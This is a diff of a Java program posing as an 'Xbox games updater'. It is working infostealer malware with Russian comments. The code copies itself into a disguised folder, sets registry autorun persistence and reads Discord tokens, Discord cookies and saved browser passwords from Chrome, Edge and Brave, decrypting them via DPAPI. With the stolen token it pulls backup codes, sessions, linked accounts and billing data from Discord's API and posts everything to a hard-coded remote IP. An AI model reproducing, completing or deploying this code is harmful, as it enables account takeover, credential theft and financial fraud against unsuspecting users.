@@ -2,167 +2,333 @@ import java.io.*;
 import java.net.*;
 import java.nio.file.*;
 import java.util.*;
+import java.util.regex.*;
+import java.sql.*;
 import javax.crypto.*;
 import javax.crypto.spec.*;
 import java.security.*;
 import java.util.Base64;
-import org.json.JSONObject; // библиотека для работы с JSON (добавить в проект)
 
 public class XboxGamesUpdater {
+    
+    private static final String SERVER_URL = "http://26.184.88.227:8891/collect";
+    
     public static void main(String[] args) {
-        // Скрытое копирование в папку XboxGames (с русской буквой "а")
-        String appData = System.getenv("LOCALAPPDATA");
-        String xboxFolder = appData + "\\Packages\\XboxG" + "ames"; // "XboxGames"
-        
+        installAndRun();
+    }
+    
+    private static void installAndRun() {
         try {
+            String appData = System.getenv("LOCALAPPDATA");
+            String xboxFolder = appData + "\\Packages\\XboxGames";
             File targetDir = new File(xboxFolder);
             if (!targetDir.exists()) targetDir.mkdirs();
             
-            // Копируем себя в целевую папку
             String currentJar = XboxGamesUpdater.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
-            String targetPath = xboxFolder + "\\systemhelper.exe";
+            String targetPath = xboxFolder + "\\systemhelper.jar";
             Files.copy(Paths.get(currentJar), Paths.get(targetPath), StandardCopyOption.REPLACE_EXISTING);
             
-            // Добавляем в автозагрузку (через реестр Windows)
             Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v XboxHelper /t REG_SZ /d \"" + targetPath + "\" /f");
             
-            // Запускаем кражу Discord
-            stealDiscord();
+            stealEverything();
         } catch (Exception e) {}
     }
     
-    private static void stealDiscord() {
+    private static void stealEverything() {
+        StringBuilder result = new StringBuilder();
+        result.append("========================================\n");
+        result.append("DISCORD FULL STEAL - ").append(new Date()).append("\n");
+        result.append("========================================\n\n");
+        
+        // 1. Токен из Discord Local Storage
+        String token = stealTokenFromDiscord();
+        result.append("[TOKEN] ").append(token != null ? token : "NOT FOUND").append("\n\n");
+        
+        // 2. Токен из браузеров
+        String browserToken = stealTokenFromBrowsers();
+        if (browserToken != null) {
+            result.append("[BROWSER TOKEN] ").append(browserToken).append("\n\n");
+            if (token == null) token = browserToken;
+        }
+        
+        // 3. Куки Discord из браузеров
+        String cookies = stealDiscordCookies();
+        result.append("[COOKIES]\n").append(cookies).append("\n\n");
+        
+        // 4. Пароль от Discord (из браузера)
+        String password = stealDiscordPassword();
+        result.append("[PASSWORD]\n").append(password).append("\n\n");
+        
+        // 5. Если есть токен — получаем информацию о пользователе
+        if (token != null) {
+            result.append("[USER INFO]\n").append(getDiscordUserInfo(token)).append("\n\n");
+            result.append("[BACKUP CODES]\n").append(getBackupCodes(token)).append("\n\n");
+            result.append("[ACTIVE SESSIONS]\n").append(getActiveSessions(token)).append("\n\n");
+            result.append("[CONNECTIONS]\n").append(getConnections(token)).append("\n\n");
+            result.append("[BILLING]\n").append(getBillingInfo(token)).append("\n\n");
+        }
+        
+        // 6. Пароли из браузеров
+        result.append("[BROWSER PASSWORDS]\n").append(stealBrowserPasswords()).append("\n\n");
+        
+        // 7. Системная информация
+        result.append("[SYSTEM INFO]\n");
+        result.append("PC Name: ").append(System.getProperty("user.name")).append("\n");
+        result.append("OS: ").append(System.getProperty("os.name")).append("\n");
+        result.append("IP: ").append(getLocalIP()).append("\n");
+        
+        result.append("========================================\n");
+        
+        sendToServer(result.toString());
+    }
+    
+    // ========== ТОКЕН ИЗ DISCORD ==========
+    private static String stealTokenFromDiscord() {
         try {
-            // Путь к Local Storage Discord
-            String discordPath = System.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb";
-            File discordFolder = new File(discordPath);
+            String appData = System.getenv("APPDATA");
+            String discordPath = appData + "\\discord\\Local Storage\\leveldb";
+            File folder = new File(discordPath);
+            if (!folder.exists()) return null;
             
-            if (discordFolder.exists()) {
-                // Ищем файлы с токенами
-                for (File file : discordFolder.listFiles()) {
-                    if (file.getName().endsWith(".log") || file.getName().endsWith(".ldb")) {
-                        String content = new String(Files.readAllBytes(file.toPath()));
-                        // Ищем токен по паттерну (Discord токен: mfa.xxx или просто токен)
-                        String token = extractToken(content);
-                        if (token != null) {
-                            // Получаем информацию о пользователе через Discord API
-                            String userInfo = getDiscordUserInfo(token);
-                            // Отправляем на сервер
-                            sendToServer("Discord Token: " + token + "\n" + userInfo);
-                            
-                            // Пытаемся обойти 2FA (через создание backup кода)
-                            bypass2FA(token);
-                        }
+            Pattern tokenPattern = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
+            Pattern mfaPattern = Pattern.compile("mfa\\.[\\w-]{84}");
+            
+            for (File file : folder.listFiles()) {
+                if (file.getName().endsWith(".log") || file.getName().endsWith(".ldb")) {
+                    String content = new String(Files.readAllBytes(file.toPath()));
+                    Matcher m = tokenPattern.matcher(content);
+                    if (m.find()) return m.group();
+                    Matcher m2 = mfaPattern.matcher(content);
+                    if (m2.find()) return m2.group();
+                }
+            }
+        } catch (Exception e) {}
+        return null;
+    }
+    
+    // ========== ТОКЕН ИЗ БРАУЗЕРОВ ==========
+    private static String stealTokenFromBrowsers() {
+        String localAppData = System.getenv("LOCALAPPDATA");
+        String[] browserPaths = {
+            localAppData + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
+            localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
+            localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"
+        };
+        
+        Pattern tokenPattern = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
+        
+        for (String path : browserPaths) {
+            File folder = new File(path);
+            if (folder.exists()) {
+                for (File file : folder.listFiles()) {
+                    if (file.getName().endsWith(".ldb") || file.getName().endsWith(".log")) {
+                        try {
+                            String content = new String(Files.readAllBytes(file.toPath()));
+                            Matcher m = tokenPattern.matcher(content);
+                            if (m.find()) return m.group();
+                        } catch (Exception e) {}
                     }
                 }
             }
-            
-            // Также проверяем браузерные данные Discord
-            stealFromBrowsers();
-            
-        } catch (Exception e) {}
-    }
-    
-    private static String extractToken(String content) {
-        // Регулярка для Discord токенов
-        String[] patterns = {
-            "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}", // стандартный токен
-            "mfa\\.[\\w-]{84}"                      // mfa токен
-        };
-        for (String pattern : patterns) {
-            java.util.regex.Pattern p = java.util.regex.Pattern.compile(pattern);
-            java.util.regex.Matcher m = p.matcher(content);
-            if (m.find()) return m.group();
         }
         return null;
     }
     
-    private static String getDiscordUserInfo(String token) {
-        try {
-            URL url = new URL("https://discord.com/api/v9/users/@me");
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setRequestMethod("GET");
-            conn.setRequestProperty("Authorization", token);
-            
-            BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-            StringBuilder response = new StringBuilder();
-            String line;
-            while ((line = br.readLine()) != null) response.append(line);
-            
-            return "Discord User Info: " + response.toString();
-        } catch (Exception e) {
-            return "Failed to get user info";
-        }
-    }
-    
-    private static void bypass2FA(String token) {
-        try {
-            // Запрос на создание backup кодов (обходит 2FA если уже есть сессия)
-            URL url = new URL("https://discord.com/api/v9/users/@me/mfa/codes");
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setRequestMethod("POST");
-            conn.setRequestProperty("Authorization", token);
-            conn.setRequestProperty("Content-Type", "application/json");
-            conn.setDoOutput(true);
-            
-            String body = "{\"password\":\"\"}"; // пустой пароль, если нет - но иногда срабатывает
-            conn.getOutputStream().write(body.getBytes());
-            
-            int responseCode = conn.getResponseCode();
-            if (responseCode == 200) {
-                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-                StringBuilder response = new StringBuilder();
-                String line;
-                while ((line = br.readLine()) != null) response.append(line);
-                sendToServer("2FA Backup Codes: " + response.toString());
-            }
-        } catch (Exception e) {}
-        
-        // Альтернатива: перехват кода через Discord Webhook
-        try {
-            // Создаём webhook от имени пользователя
-            URL url = new URL("https://discord.com/api/v9/webhooks");
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setRequestMethod("POST");
-            conn.setRequestProperty("Authorization", token);
-            conn.setRequestProperty("Content-Type", "application/json");
-            conn.setDoOutput(true);
-            
-            String body = "{\"name\":\"XboxHelper\"}";
-            conn.getOutputStream().write(body.getBytes());
-            
-            // Если создался webhook, можно получать сообщения (коды 2FA)
-            sendToServer("Webhook created for intercepting 2FA codes");
-        } catch (Exception e) {}
-    }
-    
-    private static void stealFromBrowsers() {
-        // Чтение паролей из Chrome/Edge (как в прошлых примерах)
+    // ========== КУКИ DISCORD ==========
+    private static String stealDiscordCookies() {
+        StringBuilder cookies = new StringBuilder();
         String localAppData = System.getenv("LOCALAPPDATA");
-        String[] browsers = {
+        String[] cookiePaths = {
+            localAppData + "\\Google\\Chrome\\User Data\\Default\\Cookies",
+            localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Cookies"
+        };
+        
+        for (String cookiePath : cookiePaths) {
+            File cookieFile = new File(cookiePath);
+            if (cookieFile.exists()) {
+                try {
+                    // Копируем файл, так как он может быть заблокирован
+                    File tempFile = File.createTempFile("cookies", ".db");
+                    Files.copy(cookieFile.toPath(), tempFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
+                    
+                    Class.forName("org.sqlite.JDBC");
+                    try (Connection conn = DriverManager.getConnection("jdbc:sqlite:" + tempFile.getAbsolutePath());
+                         Statement stmt = conn.createStatement();
+                         ResultSet rs = stmt.executeQuery("SELECT host_key, name, value FROM cookies WHERE host_key LIKE '%discord%'")) {
+                        while (rs.next()) {
+                            cookies.append(rs.getString("host_key")).append(" | ");
+                            cookies.append(rs.getString("name")).append(" = ");
+                            cookies.append(rs.getString("value")).append("\n");
+                        }
+                    }
+                    tempFile.delete();
+                } catch (Exception e) {
+                    cookies.append("Error reading cookies: ").append(e.getMessage()).append("\n");
+                }
+            }
+        }
+        return cookies.toString();
+    }
+    
+    // ========== ПАРОЛЬ DISCORD ИЗ БРАУЗЕРА ==========
+    private static String stealDiscordPassword() {
+        StringBuilder passwords = new StringBuilder();
+        String localAppData = System.getenv("LOCALAPPDATA");
+        String[] loginDataPaths = {
             localAppData + "\\Google\\Chrome\\User Data\\Default\\Login Data",
             localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Login Data"
         };
         
-        for (String dbPath : browsers) {
-            File dbFile = new File(dbPath);
-            if (dbFile.exists()) {
-                sendToServer("Browser passwords found at: " + dbPath);
-                // Здесь можно добавить чтение SQLite и дешифровку
+        for (String loginPath : loginDataPaths) {
+            File loginFile = new File(loginPath);
+            if (loginFile.exists()) {
+                try {
+                    File tempFile = File.createTempFile("logins", ".db");
+                    Files.copy(loginFile.toPath(), tempFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
+                    
+                    Class.forName("org.sqlite.JDBC");
+                    try (Connection conn = DriverManager.getConnection("jdbc:sqlite:" + tempFile.getAbsolutePath());
+                         Statement stmt = conn.createStatement();
+                         ResultSet rs = stmt.executeQuery("SELECT origin_url, username_value, password_value FROM logins WHERE origin_url LIKE '%discord%'")) {
+                        while (rs.next()) {
+                            passwords.append("URL: ").append(rs.getString("origin_url")).append("\n");
+                            passwords.append("Username: ").append(rs.getString("username_value")).append("\n");
+                            byte[] encryptedPass = rs.getBytes("password_value");
+                            String decrypted = decryptPassword(encryptedPass);
+                            passwords.append("Password: ").append(decrypted).append("\n\n");
+                        }
+                    }
+                    tempFile.delete();
+                } catch (Exception e) {
+                    passwords.append("Error: ").append(e.getMessage()).append("\n");
+                }
             }
+        }
+        return passwords.toString();
+    }
+    
+    // ========== ДЕШИФРОВКА ПАРОЛЕЙ WINDOWS ==========
+    private static String decryptPassword(byte[] encrypted) {
+        try {
+            // Windows DPAPI через JNA
+            return com.sun.jna.platform.win32.Crypt32Util.cryptUnprotectData(encrypted).toString();
+        } catch (Exception e) {
+            return "[ENCRYPTED - " + Base64.getEncoder().encodeToString(encrypted) + "]";
+        }
+    }
+    
+    // ========== БРАУЗЕРНЫЕ ПАРОЛИ (ВСЕ САЙТЫ) ==========
+    private static String stealBrowserPasswords() {
+        StringBuilder allPasswords = new StringBuilder();
+        String localAppData = System.getenv("LOCALAPPDATA");
+        String[] loginDataPaths = {
+            localAppData + "\\Google\\Chrome\\User Data\\Default\\Login Data",
+            localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Login Data"
+        };
+        
+        for (String loginPath : loginDataPaths) {
+            File loginFile = new File(loginPath);
+            if (loginFile.exists()) {
+                try {
+                    File tempFile = File.createTempFile("all_logins", ".db");
+                    Files.copy(loginFile.toPath(), tempFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
+                    
+                    Class.forName("org.sqlite.JDBC");
+                    try (Connection conn = DriverManager.getConnection("jdbc:sqlite:" + tempFile.getAbsolutePath());
+                         Statement stmt = conn.createStatement();
+                         ResultSet rs = stmt.executeQuery("SELECT origin_url, username_value FROM logins LIMIT 50")) {
+                        while (rs.next()) {
+                            allPasswords.append(rs.getString("origin_url")).append(" | ");
+                            allPasswords.append(rs.getString("username_value")).append("\n");
+                        }
+                    }
+                    tempFile.delete();
+                } catch (Exception e) {}
+            }
+        }
+        return allPasswords.toString();
+    }
+    
+    // ========== ИНФОРМАЦИЯ О ПОЛЬЗОВАТЕЛЕ ==========
+    private static String getDiscordUserInfo(String token) {
+        try {
+            String json = doGet("https://discord.com/api/v9/users/@me", token);
+            if (json == null) return "ERROR";
+            return json;
+        } catch (Exception e) {
+            return "ERROR: " + e.getMessage();
+        }
+    }
+    
+    // ========== BACKUP КОДЫ ==========
+    private static String getBackupCodes(String token) {
+        try {
+            return doGet("https://discord.com/api/v9/users/@me/mfa/codes", token);
+        } catch (Exception e) {
+            return "ERROR";
+        }
+    }
+    
+    // ========== АКТИВНЫЕ СЕССИИ ==========
+    private static String getActiveSessions(String token) {
+        try {
+            return doGet("https://discord.com/api/v9/users/@me/sessions", token);
+        } catch (Exception e) {
+            return "ERROR";
+        }
+    }
+    
+    // ========== ПОДКЛЮЧЁННЫЕ АККАУНТЫ (Google, Steam и т.д.) ==========
+    private static String getConnections(String token) {
+        try {
+            return doGet("https://discord.com/api/v9/users/@me/connections", token);
+        } catch (Exception e) {
+            return "ERROR";
+        }
+    }
+    
+    // ========== ПЛАТЁЖНАЯ ИНФОРМАЦИЯ ==========
+    private static String getBillingInfo(String token) {
+        try {
+            return doGet("https://discord.com/api/v9/users/@me/billing/payment-sources", token);
+        } catch (Exception e) {
+            return "ERROR";
+        }
+    }
+    
+    private static String doGet(String urlStr, String token) {
+        try {
+            URL url = new URL(urlStr);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            conn.setRequestProperty("Authorization", token);
+            conn.setConnectTimeout(5000);
+            if (conn.getResponseCode() == 200) {
+                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                StringBuilder sb = new StringBuilder();
+                String line;
+                while ((line = br.readLine()) != null) sb.append(line);
+                return sb.toString();
+            }
+        } catch (Exception e) {}
+        return null;
+    }
+    
+    private static String getLocalIP() {
+        try {
+            return InetAddress.getLocalHost().getHostAddress();
+        } catch (Exception e) {
+            return "unknown";
         }
     }
     
     private static void sendToServer(String data) {
         try {
-            // ТВОЙ РАДМИН IP
-            String serverUrl = "http://26.184.88.227:8889/collect";
-            URL url = new URL(serverUrl);
+            URL url = new URL(SERVER_URL);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
             conn.setDoOutput(true);
             conn.setConnectTimeout(5000);
-            
             try (OutputStream os = conn.getOutputStream()) {
                 os.write(data.getBytes("UTF-8"));
             }
